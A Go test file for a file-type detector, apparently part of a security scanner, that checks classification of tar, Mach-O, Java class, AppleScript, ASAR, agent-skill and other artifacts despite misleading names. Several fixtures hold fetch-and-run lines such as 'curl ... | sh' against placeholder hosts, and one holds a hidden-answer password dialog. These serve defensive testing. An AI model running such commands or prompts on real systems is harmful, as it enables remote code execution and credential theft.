package artifact

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"testing"
)

func TestDetectTarRequiresHeaderChecksum(t *testing.T) {
	var archive bytes.Buffer
	writer := tar.NewWriter(&archive)
	if err := writer.WriteHeader(&tar.Header{Name: "entry.txt", Mode: 0600, Size: 0, Format: tar.FormatUSTAR}); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	valid := archive.Bytes()
	nulTerminated := bytes.Clone(valid)
	nulTerminated[155] = 'X' // archive/tar ignores padding after the first NUL.
	signed := bytes.Clone(valid)
	signed[0] = 0xff
	var checksum int
	for i, value := range signed[:512] {
		if i >= 148 && i < 156 {
			value = ' '
		}
		checksum += int(int8(value))
	}
	copy(signed[148:156], fmt.Sprintf("%06o\x00 ", checksum))
	for _, data := range [][]byte{valid, signed, nulTerminated} {
		if _, err := tar.NewReader(bytes.NewReader(data)).Next(); err != nil {
			t.Fatalf("control header rejected by archive/tar: %v", err)
		}
		if kind, _ := Detect("misleading.js", data, false); kind != "tar" {
			t.Fatalf("valid tar header detected as %q", kind)
		}
	}
	lookalike := []byte("//" + strings.Repeat(" ", 255) + "ustar\n" + strings.Repeat(" ", 256))
	if kind, _ := Detect("source.js", lookalike, false); kind != "script" {
		t.Fatalf("incidental tar magic hid JavaScript as %q", kind)
	}
	corrupt := bytes.Clone(valid)
	corrupt[0] ^= 1
	for _, data := range [][]byte{valid[:262], corrupt, append([]byte(nil), lookalike[:262]...)} {
		if hasTarMagic(data) {
			t.Fatal("truncated or invalid first header accepted")
		}
	}
	if kind, _ := Detect("damaged.tar", corrupt, false); kind != "tar" {
		t.Fatalf("explicit binary tar candidate lost archive coverage: %q", kind)
	}
}

func TestDetectCompiledAppleScriptByMagic(t *testing.T) {
	for _, data := range [][]byte{
		append([]byte(compiledAppleScriptMagic+" 1.101.10"), 0, 4, 15, 0xff, 0xff),
	} {
		kind, media := Detect("prompt.scpt", data, false)
		if kind != "compiled-applescript" || media != "application/x-apple-compiled-applescript" {
			t.Fatalf("Detect(compiled AppleScript) = %q %q, want compiled-applescript application/x-apple-compiled-applescript", kind, media)
		}
	}
}

func TestDetectJavaClassBeforeCollidingFatMachOMagic(t *testing.T) {
	data := testJavaClass()
	for _, name := range []string{"Example.class", "renamed.bin", "extensionless"} {
		t.Run(name, func(t *testing.T) {
			kind, media := Detect(name, data, true)
			if kind != "java-class" || media != "application/java-vm" {
				t.Fatalf("Detect(%s Java class) = %q %q, want java-class application/java-vm", name, kind, media)
			}
		})
	}
}

func TestDetectValidFatMachOWithClassSuffixRemainsMachO(t *testing.T) {
	data := testFatMachO(binary.BigEndian, false, testThinMachO())
	kind, media := Detect("misleading.class", data, false)
	if kind != "macho-fat" || media != "application/x-mach-binary" {
		t.Fatalf("Detect(valid fat Mach-O) = %q %q, want macho-fat application/x-mach-binary", kind, media)
	}
}

func TestDetectMalformedJavaClassMagicPreservesFatMachOCoverage(t *testing.T) {
	data := []byte{0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 61, 0xff, 0xff}
	kind, media := Detect("malformed.class", data, false)
	if kind != "macho-fat" || media != "application/x-mach-binary" {
		t.Fatalf("Detect(malformed CAFEBABE) = %q %q, want macho-fat application/x-mach-binary", kind, media)
	}
}

func testJavaClass() []byte {
	var out bytes.Buffer
	out.Write([]byte{0xca, 0xfe, 0xba, 0xbe})
	_ = binary.Write(&out, binary.BigEndian, uint16(0))
	_ = binary.Write(&out, binary.BigEndian, uint16(52))
	_ = binary.Write(&out, binary.BigEndian, uint16(5))
	out.WriteByte(1)
	_ = binary.Write(&out, binary.BigEndian, uint16(len("Example")))
	out.WriteString("Example")
	out.WriteByte(7)
	_ = binary.Write(&out, binary.BigEndian, uint16(1))
	out.WriteByte(1)
	_ = binary.Write(&out, binary.BigEndian, uint16(len("java/lang/Object")))
	out.WriteString("java/lang/Object")
	out.WriteByte(7)
	_ = binary.Write(&out, binary.BigEndian, uint16(3))
	for _, value := range []uint16{
		0x0021, // access_flags
		2,      // this_class
		4,      // super_class
		0,      // interfaces_count
		0,      // fields_count
		0,      // methods_count
		0,      // attributes_count
	} {
		_ = binary.Write(&out, binary.BigEndian, value)
	}
	return out.Bytes()
}

func TestDetectTextBeginningWithCompiledAppleScriptMagicRemainsText(t *testing.T) {
	data := []byte("FasdUAS\ncurl https://text.example/payload | sh\n")
	kind, media := Detect("payload.sh", data, true)
	if kind != "script" || media != "text/plain" {
		t.Fatalf("Detect(text magic collision) = %q %q, want script text/plain", kind, media)
	}
}

func TestDetectCompiledAppleScriptMagicOverridesMisleadingOrMissingExtension(t *testing.T) {
	data := append([]byte(compiledAppleScriptMagic+" 1.101.10"), 0, 4, 15, 0xff, 0xff)
	for _, name := range []string{"payload", "payload.txt", "payload.jpg"} {
		t.Run(name, func(t *testing.T) {
			kind, media := Detect(name, data, false)
			if kind != "compiled-applescript" || media != "application/x-apple-compiled-applescript" {
				t.Fatalf("Detect(%s compiled AppleScript) = %q %q", name, kind, media)
			}
		})
	}
}

func TestDetectCompiledAppleScriptRequiresCanonicalPrefixAtByteZero(t *testing.T) {
	for _, data := range [][]byte{
		append([]byte("x"+compiledAppleScriptMagic+" 1.101.10"), 0),
		append([]byte("FasdUAX 1.101.10"), 0),
		append([]byte("FasdUAT 1.101.10"), 0),
		[]byte("FasdUA"),
	} {
		kind, media := Detect("payload.bin", data, false)
		if kind == "compiled-applescript" || media == "application/x-apple-compiled-applescript" {
			t.Fatalf("Detect(close negative) = %q %q for %q", kind, media, data)
		}
	}
}

func TestDetectSourceScptAsScript(t *testing.T) {
	kind, media := Detect("prompt.scpt", []byte(`display dialog "Password:" default answer "" with hidden answer`), false)
	if kind != "script" || media != "text/plain" {
		t.Fatalf("Detect(.scpt source) = %q %q, want script text/plain", kind, media)
	}
	if got := Language("prompt.scpt"); got != "applescript" {
		t.Fatalf("Language(.scpt) = %q, want applescript", got)
	}
}

func TestLanguageRecognizesGoAsNativeSource(t *testing.T) {
	if got := Language("collector.go"); got != "native-source" {
		t.Fatalf("Language(.go) = %q, want native-source", got)
	}
}

func TestDetectRustInnerAttributeAsSourceText(t *testing.T) {
	kind, media := Detect("build.rs", []byte("#![allow(unknown_lints)]\nfn main() {}\n"), false)
	if kind != "text" || media != "text/plain" {
		t.Fatalf("Rust inner attribute classified as %s %s, want source text", kind, media)
	}

	kind, _ = Detect("polyglot.rs", []byte("#!/bin/sh\necho inert\n"), false)
	if kind != "script" {
		t.Fatalf("supported source-file shebang classified as %s, want script", kind)
	}
}

func TestDetectExtensionlessShebangAsScript(t *testing.T) {
	kind, media := Detect("installerScript", []byte("#!/bin/bash\ncurl https://example.invalid/p | sh\n"), false)
	if kind != "script" || media != "text/plain" {
		t.Fatalf("Detect(shebang script) = %q %q, want script text/plain", kind, media)
	}
}

func TestDetectExecutableXcodeProjectAsManifest(t *testing.T) {
	data := []byte(`// !$*UTF8*$!
{
	archiveVersion = 1;
	objects = {};
}`)
	kind, media := Detect("project.pbxproj", data, true)
	if kind != "manifest" || media != "text/plain" {
		t.Fatalf("Detect(executable project.pbxproj) = %q %q, want manifest text/plain", kind, media)
	}
	if got := Language("App.xcodeproj/project.pbxproj"); got != "xcode-project" {
		t.Fatalf("Language(project.pbxproj) = %q, want xcode-project", got)
	}
}

func TestDetectExecutableShellScriptRemainsScript(t *testing.T) {
	kind, media := Detect("build.sh", []byte("curl https://example.invalid/p | sh\n"), true)
	if kind != "script" || media != "text/plain" {
		t.Fatalf("Detect(executable build.sh) = %q %q, want script text/plain", kind, media)
	}
}

func TestDetectExactCaseTextualAgentSkill(t *testing.T) {
	data := []byte("---\nname: example\n---\n# Example skill\n")
	for _, name := range []string{
		"SKILL.md",
		"bundle/skills/example/SKILL.md",
		"bundle.zip!skills/example/SKILL.md",
	} {
		t.Run(name, func(t *testing.T) {
			kind, media := Detect(name, data, false)
			if kind != "agent-skill" || media != "text/markdown" {
				t.Fatalf("Detect(%s) = %q %q, want agent-skill text/markdown", name, kind, media)
			}
		})
	}
}

func TestDetectAgentSkillRequiresExactCaseAndName(t *testing.T) {
	data := []byte("# Documentation\n")
	for _, name := range []string{"skill.md", "Skill.md", "README.md", "SKILL.MD"} {
		t.Run(name, func(t *testing.T) {
			kind, media := Detect(name, data, false)
			if kind == "agent-skill" || media == "text/markdown" {
				t.Fatalf("Detect(%s) = %q %q, must not identify an agent skill", name, kind, media)
			}
		})
	}
}

func TestDetectAgentSkillNameDoesNotOverrideMagic(t *testing.T) {
	tests := []struct {
		name      string
		data      []byte
		wantKind  string
		wantMedia string
	}{
		{
			name:      "zip",
			data:      []byte("PK\x05\x06"),
			wantKind:  "zip",
			wantMedia: "application/zip",
		},
		{
			name:      "Mach-O",
			data:      []byte{0xfe, 0xed, 0xfa, 0xcf},
			wantKind:  "macho",
			wantMedia: "application/x-mach-binary",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			kind, media := Detect("SKILL.md", tt.data, false)
			if kind != tt.wantKind || media != tt.wantMedia {
				t.Fatalf("Detect(SKILL.md %s) = %q %q, want %s %s", tt.name, kind, media, tt.wantKind, tt.wantMedia)
			}
		})
	}
}

func TestDetectAgentSkillNameDoesNotHideScriptShebang(t *testing.T) {
	for _, data := range [][]byte{
		[]byte("#!/bin/sh\nprintf 'not a skill'\n"),
		[]byte("#!/usr/bin/env python3\nprint('not a skill')\n"),
		[]byte("#!/usr/bin/ruby\nputs 'not a skill'\n"),
		[]byte("#!/usr/bin/wish\nputs {not a skill}\n"),
	} {
		kind, media := Detect("SKILL.md", data, false)
		if kind != "script" || media != "text/plain" {
			t.Fatalf("Detect(SKILL.md shebang) = %q %q, want script text/plain", kind, media)
		}
	}
}

func TestDetectAgentSkillRequiresCompleteShebangDeclaration(t *testing.T) {
	for _, data := range [][]byte{
		[]byte("#!  \n# ordinary skill text\n"),
		[]byte("#!/bin/sh"),
		append([]byte("#!/bin/sh"), bytes.Repeat([]byte{' '}, maxShebangBytes)...),
	} {
		kind, media := Detect("SKILL.md", data, false)
		if kind != "agent-skill" || media != "text/markdown" {
			t.Fatalf("Detect(SKILL.md malformed shebang) = %q %q, want agent-skill text/markdown", kind, media)
		}
	}
}

func TestDetectAgentSkillRejectsNULOrInvalidUTF8Anywhere(t *testing.T) {
	for _, tt := range []struct {
		name string
		data []byte
	}{
		{
			name: "NUL in prefix",
			data: []byte("# Skill\x00\n"),
		},
		{
			name: "invalid UTF-8 in prefix",
			data: []byte{'#', ' ', 0xff, '\n'},
		},
		{
			name: "NUL after text sample",
			data: append(bytes.Repeat([]byte{'a'}, 9000), 0),
		},
		{
			name: "invalid UTF-8 after text sample",
			data: append(bytes.Repeat([]byte{'a'}, 9000), 0xff),
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			kind, media := Detect("SKILL.md", tt.data, false)
			if kind == "agent-skill" || media == "text/markdown" {
				t.Fatalf("Detect(SKILL.md %s) = %q %q, must not identify an agent skill", tt.name, kind, media)
			}
		})
	}
}

func TestDetectResourcesIgnoreExecutableBit(t *testing.T) {
	tests := []struct {
		name      string
		data      []byte
		wantMedia string
	}{
		{"AppIcon.icns", []byte("icns\x00\x00\x00\x08"), "image/icns"},
		{"image.png", []byte{0x89, 'P', 'N', 'G', '\r', '\n'}, "image/png"},
		{"Credits.rtf", []byte(`{\rtf1\ansi text}`), "text/rtf"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			kind, media := Detect(tt.name, tt.data, true)
			if kind != "resource" || media != tt.wantMedia {
				t.Fatalf("Detect(%s executable resource) = %q %q, want resource %q", tt.name, kind, media, tt.wantMedia)
			}
		})
	}
}

func TestDetectAppleDoubleMetadataIgnoresExecutableBitAndSuffix(t *testing.T) {
	data := make([]byte, 39)
	binary.BigEndian.PutUint32(data[0:4], 0x00051607)
	binary.BigEndian.PutUint32(data[4:8], 0x00020000)
	binary.BigEndian.PutUint16(data[24:26], 1)
	binary.BigEndian.PutUint32(data[26:30], 9)
	binary.BigEndian.PutUint32(data[30:34], 38)
	binary.BigEndian.PutUint32(data[34:38], 1)
	for _, name := range []string{"._project.pbxproj", "._install.sh", "payload"} {
		kind, media := Detect(name, data, true)
		if kind != "resource" || media != "application/applefile" {
			t.Fatalf("Detect(%s AppleDouble) = %q %q, want resource application/applefile", name, kind, media)
		}
	}
}

func TestDetectMalformedAppleDoubleMagicDoesNotHideExecutable(t *testing.T) {
	tests := [][]byte{
		{0x00, 0x05, 0x16, 0x07},
		append([]byte{0x00, 0x05, 0x16, 0x07, 0, 3, 0, 0}, make([]byte, 18)...),
	}
	tablePastEnd := make([]byte, 26)
	binary.BigEndian.PutUint32(tablePastEnd[0:4], 0x00051607)
	binary.BigEndian.PutUint32(tablePastEnd[4:8], 0x00020000)
	binary.BigEndian.PutUint16(tablePastEnd[24:26], 1)
	tests = append(tests, tablePastEnd)
	invalidEntryExtent := make([]byte, 38)
	binary.BigEndian.PutUint32(invalidEntryExtent[0:4], 0x00051607)
	binary.BigEndian.PutUint32(invalidEntryExtent[4:8], 0x00020000)
	binary.BigEndian.PutUint16(invalidEntryExtent[24:26], 1)
	binary.BigEndian.PutUint32(invalidEntryExtent[26:30], 9)
	binary.BigEndian.PutUint32(invalidEntryExtent[30:34], 37)
	binary.BigEndian.PutUint32(invalidEntryExtent[34:38], 2)
	tests = append(tests, invalidEntryExtent)
	for _, data := range tests {
		kind, media := Detect("._payload", data, true)
		if kind != "executable" || media != "application/octet-stream" {
			t.Fatalf("Detect(malformed AppleDouble) = %q %q, want executable application/octet-stream", kind, media)
		}
	}
}

func TestDetectTextResourceHintDoesNotOverrideContent(t *testing.T) {
	kind, media := Detect("InfoPlist.strings", []byte(`"CFBundleName" = "Sample";`), false)
	if kind != "text" || media != "text/plain" {
		t.Fatalf("Detect(text .strings) = %q %q, want text text/plain", kind, media)
	}
}

func TestDetectTextScriptOverridesMisleadingContainerOrResourceSuffix(t *testing.T) {
	data := []byte("#!/bin/sh\ncurl https://renamed.example/payload | sh\n")
	for _, name := range []string{"payload.png", "payload.jpg", "payload.pdf", "payload.tar", "payload.dmg"} {
		t.Run(name, func(t *testing.T) {
			kind, media := Detect(name, data, false)
			if kind != "script" || media != "text/plain" {
				t.Fatalf("Detect(%s text script) = %q %q, want script text/plain", name, kind, media)
			}
		})
	}
}

func TestDetectEmptyZipArchive(t *testing.T) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}

	kind, media := Detect("empty.zip", buf.Bytes(), false)
	if kind != "zip" || media != "application/zip" {
		t.Fatalf("Detect(empty zip) = %q %q, want zip application/zip", kind, media)
	}
}

func TestDetectASARFromStructureInsteadOfSuffix(t *testing.T) {
	data, err := writeTestAsar(map[string][]byte{"main.js": []byte("console.log('ok')\n")})
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"renamed.payload", "misleading.tar"} {
		kind, media := Detect(name, data, false)
		if kind != "asar" || media != "application/x-asar" {
			t.Fatalf("Detect(%s valid ASAR) = %q %q, want asar application/x-asar", name, kind, media)
		}
	}
}

func TestDetectTextNamedASARRetainsTextSemantics(t *testing.T) {
	kind, media := Detect("installer.asar", []byte("#!/bin/sh\necho still-source\n"), true)
	if kind != "script" || media != "text/plain" {
		t.Fatalf("Detect(text named .asar) = %q %q, want script text/plain", kind, media)
	}
}

func TestDetectUTF8ScriptNamedASARRetainsTextSemantics(t *testing.T) {
	data := []byte("#!/bin/sh\n# " + strings.Repeat("🍏", 5000) + "\necho source\n")
	kind, media := Detect("installer.asar", data, true)
	if kind != "script" || media != "text/plain" {
		t.Fatalf("Detect(UTF-8 text named .asar) = %q %q, want script text/plain", kind, media)
	}
}

func TestDetectInvalidUTF8DoesNotBecomeText(t *testing.T) {
	data := bytes.Repeat([]byte{0xff, 0xfe, 0xfd}, 100)
	kind, media := Detect("payload", data, false)
	if kind != "blob" || media != "application/octet-stream" {
		t.Fatalf("Detect(invalid UTF-8) = %q %q, want blob application/octet-stream", kind, media)
	}
}

func TestDetectMalformedRenamedASARDoesNotPromoteByShapeHint(t *testing.T) {
	data := make([]byte, 20)
	binary.LittleEndian.PutUint32(data[0:4], 4)
	binary.LittleEndian.PutUint32(data[4:8], 12)
	kind, media := Detect("renamed.payload", data, false)
	if kind == "asar" || media == "application/x-asar" {
		t.Fatalf("Detect(malformed renamed ASAR) = %q %q", kind, media)
	}
}

func TestDetectJarFromZipMagicAndExtension(t *testing.T) {
	kind, media := Detect("sample.jar", []byte("PK\x05\x06"), false)
	if kind != "java-archive" || media != "application/zip" {
		t.Fatalf("Detect(empty jar) = %q %q, want java-archive application/zip", kind, media)
	}
}

func TestDetectVSIXArchiveAndManifest(t *testing.T) {
	kind, media := Detect("sample.vsix", []byte("PK\x05\x06"), false)
	if kind != "vsix" || media != "application/zip" {
		t.Fatalf("Detect(empty vsix) = %q %q, want vsix application/zip", kind, media)
	}
	kind, media = Detect("extension.vsixmanifest", []byte("<PackageManifest></PackageManifest>"), false)
	if kind != "manifest" || media != "text/plain" {
		t.Fatalf("Detect(vsixmanifest) = %q %q, want manifest text/plain", kind, media)
	}
}

func TestDetectPythonWheelEntrypointsManifest(t *testing.T) {
	kind, media := Detect("package-1.0.dist-info/entry_points.txt", []byte("[console_scripts]\nrun = pkg.cli:main\n"), false)
	if kind != "manifest" || media != "text/plain" {
		t.Fatalf("Detect(entry_points.txt) = %q %q, want manifest text/plain", kind, media)
	}
}

func TestDetectSkippedEntryUsesOnlyNameHints(t *testing.T) {
	kind, media := detectSkippedEntry("archive.zip!payload", false)
	if kind != "blob" || media != "application/octet-stream" {
		t.Fatalf("DetectSkippedEntry(extensionless payload) = %q %q, want blob application/octet-stream", kind, media)
	}
	kind, media = detectSkippedEntry("archive.zip!install.sh", false)
	if kind != "script" || media != "text/plain" {
		t.Fatalf("DetectSkippedEntry(script) = %q %q, want script text/plain", kind, media)
	}
	kind, media = detectSkippedEntry("archive.zip!nested.zip", false)
	if kind != "zip" || media != "application/zip" {
		t.Fatalf("DetectSkippedEntry(zip) = %q %q, want zip application/zip", kind, media)
	}
}
